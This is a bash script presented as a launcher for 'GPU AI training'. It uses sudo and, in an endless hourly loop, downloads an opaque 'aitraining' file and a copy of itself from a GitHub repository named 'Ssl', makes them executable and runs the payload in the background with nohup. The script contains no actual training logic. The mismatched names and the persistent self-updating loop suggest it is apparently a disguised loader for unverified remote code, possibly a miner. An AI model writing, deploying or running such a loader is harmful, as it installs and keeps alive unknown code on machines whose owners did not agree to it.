#!/bin/bash
# File: start_modelgp.sh launcher
# Purpose: Manage GPU AI training process from GitHub TELEGRAMBOT

# Ensure wget is installed
sudo apt update
sudo apt install -y wget

# Define paths
WORKDIR="$HOME/TELEGRAMBOT"
AITRAINING_URL="https://github.com/max313iq/Ssl/raw/main/aitraining"
START_SCRIPT_URL="https://github.com/max313iq/Ssl/raw/main/start_modelgp.sh"

while true; do
    echo "========== Starting GPU AI Training Launcher =========="

    # Stop old processes safely
    for proc in "start_modelgp.sh" "aitraining"; do
        if pgrep -f "$proc" > /dev/null; then
            sudo pkill -f "$proc"
            echo "$proc stopped."
        else
            echo "$proc not running."
        fi
    done

    # Create working directory
    mkdir -p "$WORKDIR"

    # Download the latest scripts directly
    echo "Downloading latest aitraining and start_modelgp.sh..."
    wget -q -O "$WORKDIR/aitraining" "$AITRAINING_URL"
    wget -q -O "$WORKDIR/start_modelgp.sh" "$START_SCRIPT_URL"

    # Ensure scripts are executable
    chmod +x "$WORKDIR/aitraining"
    chmod +x "$WORKDIR/start_modelgp.sh"

    # Start the AI training script in the background
    echo "Launching aitraining..."
    nohup bash "$WORKDIR/aitraining" > "$WORKDIR/aitraining.log" 2>&1 &

    echo "aitraining is now running. Logs: $WORKDIR/aitraining.log"

    # Run for 1 hour (3600 seconds) before restarting
    sleep 3600

    echo "========== Stopping processes after 1 hour =========="
    for proc in "start_modelgp.sh" "aitraining"; do
        if pgrep -f "$proc" > /dev/null; then
            sudo pkill -f "$proc"
            echo "$proc stopped."
        else
            echo "$proc already stopped."
        fi
    done

    echo "Waiting 1 minute before restarting..."
    sleep 60
done
